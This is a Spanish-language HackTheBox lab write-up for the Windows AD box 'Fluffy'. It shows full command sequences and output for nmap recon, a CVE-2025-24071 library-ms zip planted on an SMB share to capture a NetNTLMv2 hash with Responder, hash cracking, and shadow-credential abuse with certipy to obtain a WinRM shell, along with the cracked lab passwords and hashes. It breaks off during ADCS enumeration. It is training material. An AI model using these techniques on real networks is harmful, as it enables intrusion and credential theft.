---
title: HackTheBox Fluffy Writeup
published: true
---

> **Fluffy** es un desafío de Windows Active Directory basado en supuestas infracciones. Comenzaré explotando `CVE-2025-24071 / CVE-2025-24055`, una vulnerabilidad en la gestión de archivos library-ms en archivos zip, lo que provoca intentos de autenticación del atacante. Obtendré un NetNTLMv2 y lo descifraré. 

A partir de ahí, los datos de BloodHound muestran que este usuario tiene `GenericWrite` en algunas cuentas de servicio. Lo aprovecharé para obtener un shell WinRM con una. A partir de este usuario, explotaré ESC16 en el entorno ADCS para obtener un shell como administrador.


-


![Captura de pantalla de la web](assets/images/Fluffy/imagen_1.png)


# 🔍 Reconocimiento

---

**nmap** encuentra un montón de puertos TCP abiertos :

-


```nmap
jorgeº@hacky$ nmap -p- --min-rate 10000 10.10.11.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 02:11 UTC
Nmap scan report for 10.10.11.69
Host is up (0.094s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49685/tcp open  unknown
49701/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
jorge@hacky$ nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985 -vv -sCV 10.10.11.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 02:12 UTC
...[snip]...
Nmap scan report for 10.10.11.69
Host is up, received echo-reply ttl 127 (0.094s latency).
Scanned at 2025-05-22 02:12:31 UTC for 91s

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-22 02:12:37Z)
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
...[snip]...
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-22T02:14:01+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-22T02:14:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
...[snip]...
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
...[snip]...
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-22T02:14:01+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-22T02:14:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
...[snip]...
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 19123/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 54887/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-05-22T02:13:21
|_  start_date: N/A
...[snip]...
Nmap done: 1 IP address (1 host up) scanned in 91.60 seconds

```

El cuadro muestra muchos de los puertos asociados a un controlador de dominio de Windows . El dominio es `fluffy.htb` y el nombre de host es `DC01`.

Lo usaré `netexec` para generar un `hosts` archivo:

```nmap
jorge@hacky$ netexec smb 10.10.11.69 --generate-hosts-file hosts
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
jorge@hacky$ cat hosts /etc/hosts | sponge /etc/hosts
```
-

# 🔐 Credenciales iniciales

HackTheBox proporciona el siguiente escenario asociado con `Puppy`:

>Como es común en las pruebas de penetración de Windows en la vida real, iniciará el cuadro Fluffy con las credenciales de la siguiente cuenta:
j.fleischman / J0elTHEM4n1990.

-

Las credenciales funcionan :

```nmap
jorge@hacky$ netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

- 

También funcionan para `LDAP`, pero no para `WinRM` (como era de esperar):

```nmap
jorge@hacky$ netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
jorge@hacky$ netexec winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```
-

Teniendo esto en cuenta, querré priorizar cosas como:

- Acciones de `SMB`
- `Bloodhound` (que incluye la mayoría de los datos de LDAP)
- ADCS

-

# 🧑‍💻 ADCS

Comprobaré si Fluffy está ejecutando ADCS usando el `netexec` módulo:

```namp
jorge@hacky$ netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
ADCS        10.10.11.69     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.69     389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.10.11.69     389    DC01             Found CN: fluffy-DC01-CA
```

-

Esto demuestra que hay una autoridad de certificación y querré ejecutarla `certipy` para buscar vulnerabilidades:


```namp
jorge@hacky$ certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

-

No hay nada aquí que parezca explotable en este momento. Obtendré una lista de todas las plantillas en el controlador de dominio eliminando la `-vulnerable` bandera:


```namp
oxdf@hacky$ certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers


```

No necesito dedicarle mucho tiempo a esto ahora, aunque podría volver y analizarlo más de cerca si no veo un camino a seguir.

-

# 👉 Bloodhound

Usaré `BloodHound.py` para recopilar datos de Bloodhound:

```nmap
jorge@hacky$ bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20250522022823_bloodhound.zip
```

-

Iniciaré `Bloodhound Docker` y cargaré el archivo zip.

Comenzaré con `j.fleischman` y los marcaré como propios:

![Captura de pantalla de la web](assets/images/Fluffy/imagen_2.webp)


No tienen ningún control de salida interesante.

-


# 📄 SMB - TCP 445

Además de los recursos compartidos SMB estándar en un controlador de dominio de Windows, hay un recurso compartido llamado `IT` al que `j.fleischman` tiene acceso de lectura y escritura :

```nmap
jorge@hacky$ netexec smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```
-

Me conectaré al `IT` recurso compartido y hay algunos archivos :

```nmap
jorge@hacky$ smbclient  '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 22 02:34:25 2025
  ..                                  D        0  Thu May 22 02:34:25 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1465188 blocks available

```
-

Hay dos archivos `zip` que parecen estar extraídos. Y un `PDF`, que descargaré:

```nmap
smb: \> get Upgrade_Notice.pdf

getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (245.5 KiloBytes/sec) (average 245.5 KiloBytes/sec)
```
-

El `PDF` tiene dos páginas sobre una próxima ventana de actualización :

---

![Captura de pantalla de la web](assets/images/Fluffy/imagen_3.webp)


Hay una dirección de correo electrónico al final:


![Captura de pantalla de la web](assets/images/Fluffy/imagen_4.webp)

-

# 📌 Autorización como p.agila

## CVE-2025-24071 / CVE-2025-24054

Normalmente, este tipo de listas de CVE en CTF ofrecen pistas sobre dónde buscar. Al revisar la lista, `CVE-2025-24071` fue noticia importante alrededor de marzo de 2025:

---

![Captura de pantalla de la web](assets/images/Fluffy/imagen_5.webp)

También tiene que ver con los archivos Zip, de los que ya he hablado un par en el recurso compartido.

-

### Fondo

La descripción NIST de este `CVE` es muy débil:

> La exposición de información confidencial a un actor no autorizado en el Explorador de archivos de Windows permite que un atacante no autorizado realice suplantación de identidad a través de una red.


Resulta que Microsoft solicitó inicialmente `CVE-2025-27071,` pero luego lo actualizó a `CVE-2025-24054`.

Afortunadamente, esta fue una vulnerabilidad bastante popular cuando salió, y hay muchos otros artículos (como este y este ] que la explican en profundidad.

Hay una falla en el Explorador de Windows y en cómo procesa un archivo Zip o Rar que `.library-ms` contiene un archivo malicioso. Al extraer o interactuar con este archivo malicioso, se activa un intento de autenticación `NTLM` en un servidor controlado por el atacante.


>Los informes iniciales sugerían que la explotación se producía una vez `.library-ms` descomprimido el archivo. Sin embargo, la documentación del parche de Microsoft indicó que la vulnerabilidad podía activarse incluso con una mínima interacción del usuario, como hacer clic derecho, arrastrar y soltar, o simplemente acceder a la carpeta que contiene el archivo malicioso. Este exploit parece ser una variante de una vulnerabilidad previamente parcheada, `CVE-2024-43451` , ya que ambas comparten varias similitudes.

-

### EXPLOTAR

Existen varias pruebas de concepto (POC) para esta vulnerabilidad desde el lanzamiento de `Fluffy.` Tomaré esta de Marcejr117 y copiaré el `poc.py` archivo a mi host.

Ejecutaré el script con uv(consulte mi hoja de trucos de uv para obtener más detalles):

```nmap
jorge@hacky$ uv run --script poc.py 0xdf 10.10.14.6

[+] File 0xdf.library-ms created successfully.

```

Dado que el objetivo de este exploit es lograr que la víctima intente autenticarse en mi host, iniciaré Responder :

```nmap
jorge@hacky$ sudo uv run /opt/Responder/Responder.py -I tun0
...[snip]...
```

Subiré el exploit al recurso compartido `SMB`:

```nmap
smb: \> put exploit.zip 
putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.9 kb/s)
smb: \> ls
  .                                   D        0  Thu May 22 03:12:06 2025
  ..                                  D        0  Thu May 22 03:12:06 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  exploit.zip                         A      316  Thu May 22 03:12:07 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1688505 blocks available

```

Menos de un minuto después, ya lo habían extraído:

```nmap
smb: \> ls
  .                                   D        0  Thu May 22 03:12:29 2025
  ..                                  D        0  Thu May 22 03:12:29 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  exploit                             D        0  Thu May 22 03:12:30 2025
  exploit.zip                         A      316  Thu May 22 03:12:07 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1688405 blocks available
```

Y luego está el contacto en Responder de `Fluffy` :

```nmap
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:f67da47ac52b4d7b:143C3425DC8AC6BFEF42B719CA41C173:01010000000000008057D628C7CADB012A238DF04572E5670000000002000800510050003300320001001E00570049004E002D003300510030005A004F005400340045004A004A00300004003400570049004E002D003300510030005A004F005400340045004A004A0030002E0051005000330032002E004C004F00430041004C000300140051005000330032002E004C004F00430041004C000500140051005000330032002E004C004F00430041004C00070008008057D628C7CADB010600040002000000080030003000000000000000010000000020000028FE1C4585CB6A70254F0F619A4728E9E5CC246FDF1BF22B25ACE1C6B05FA9F60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
```

-

# 🧩 Crack Hash
## hashcat

Este hash es un hash `Net-NTLMv2` . En realidad, no es un hash, sino un desafío y respuesta criptográficos. A diferencia de un hash NTLM, un hash Net-NTLMv2 no puede utilizarse como método de autenticación. Puede retransmitirse o descifrarse. Dado que solo hay un host, y que normalmente no funciona la retransmisión al host de origen, intentaré descifrarlo.

Tendré el `"hash"` en un archivo y se lo pasaré a hashcat. hashcatPuede identificar el formato automáticamente y descifrarlo en segundos:

```nmap
$ hashcat p.agila.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
P.AGILA::FLUFFY:f67da47ac52b4d7b:143c3425dc8ac6bfef42b719ca41c173:01010000000000008057d628c7cadb012a238df04572e5670000000002000800510050003300320001001e00570049004e002d003300510030005a004f005400340045004a004a00300004003400570049004e002d003300510030005a004f005400340045004a004a0030002e0051005000330032002e004c004f00430041004c000300140051005000330032002e004c004f00430041004c000500140051005000330032002e004c004f00430041004c00070008008057d628c7cadb010600040002000000080030003000000000000000010000000020000028fe1c4585cb6a70254f0f619a4728e9e5cc246fdf1bf22b25ace1c6b05fa9f60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:prometheusx-303
...[snip]...
```

## 🧪 Verificación

Me aseguraré de que esta contraseña funcione:

```nmap
jorge@hacky$ netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 

```

No funciona para `WinRM` : 

```nmap
jorge@hacky$ netexec winrm dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303    

```
-

# ✨ Shell como winrm_svc

## Enumeración

Marcaré `p.agila` como propiedad de Bloodhound y observaré su control de objetos salientes:

---

![Captura de pantalla de la web](assets/images/Fluffy/imagen_6.webp)

Al ser miembros de los Administradores de Cuentas de Servicio, tienen acceso `GenericAll` al grupo de Cuentas de Servicio. Al hacer clic en ese grupo y consultar su control de salida, se observa que tiene `GenericWrite` más de tres cuentas:

---
![Captura de pantalla de la web](assets/images/Fluffy/imagen_7.webp)


`winrm_svc` es miembro del grupo Usuarios de administración remota :

![Captura de pantalla de la web](assets/images/Fluffy/imagen_8.webp)

También pude ver todo esto a la vez yendo a la pestaña Cypher en `Bloodhound`, haciendo clic en el ícono de la carpeta para abrir las consultas predefinidas y seleccionando "Rutas más cortas desde objetos propios":

---

![Captura de pantalla de la web](assets/images/Fluffy/imagen_9.webp)


Exploraré `ca_svc` más tarde, pero primero voy a `winrm_svc`.

-

# 💡 Recuperar NTLM para winrm_svc
## Agregar p.agila a las cuentas de servicio

Comenzaré agregando el usuario `p.agila` al grupo Cuentas de Servicio. Esto se hace fácilmente con varias herramientas. Usaré BloodyAD :

```nmap
jorge@hacky$ bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts 
```

## Credencial de sombra

Ahora p.agila debería tener `GenericWrite` acceso a winrm_svc. Con `GenericWrite` un usuario, puedo usar Kerberoast (darle un SPN, obtener un hash e intentar descifrarlo para obtener su contraseña), cambiar su contraseña o agregar una credencial shadow. Para la credencial shadow, usaré `certipy`:

```nmap
jorge@hacky$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ce14ad2d-fb9d-1e9b-9fdb-a3aac3abbebd'
[*] Adding Key Credential with device ID 'ce14ad2d-fb9d-1e9b-9fdb-a3aac3abbebd' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'ce14ad2d-fb9d-1e9b-9fdb-a3aac3abbebd' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
-

Este comando devuelve un TGT de Kerberos que puedo usar para autenticar y el hash NTLM de la cuenta.

Tomaré lo mismo para `ca_svc`:

```nmap
jorge@hacky$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
...[snip]...
[*] Saved credential cache to 'ca_svc.ccache'
...[snip]...
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

## WinRM

Con el hash `NTLM`, puedo obtener una sesión WinRM usando `evil-winrm-py` :

```nmap
jorge@hacky$ evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v0.0.8
[*] Connecting to dc01.fluffy.htb:5985 as winrm_svc
evil-winrm-py PS C:\Users\winrm_svc\Documents>
```

Y `user.txt` :

```nmap
evil-winrm-py PS C:\Users\winrm_svc\desktop> cat user.txt
e3f68cd8************************
```
-

# 👍 Shell como administrador

## Enumeración

Los miembros del grupo Cuentas de servicio tienen `GenericWrite` sobre el usuario `ca_svc`, que es miembro del Grupo de publicadores de certificados, que a su vez es miembro del Grupo de replicación de contraseña `RODC` denegada.

---

![Captura de pantalla de la web](assets/images/Fluffy/imagen_10.webp)


El grupo de replicación de contraseñas `RODC` denegadas es un grupo conocido que impide que las contraseñas de sus miembros se almacenen en caché en controladores de dominio de solo lectura (RODC). Esta pertenencia no revela una ruta de explotación, pero sí demuestra que se trata de un grupo valioso.


## ADCS

El nombre del usuario y el grupo son excelentes pistas para analizar `ADCS`. Los usaré `certipy` para buscar vulnerabilidades:

```nmap
jorge@hacky$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
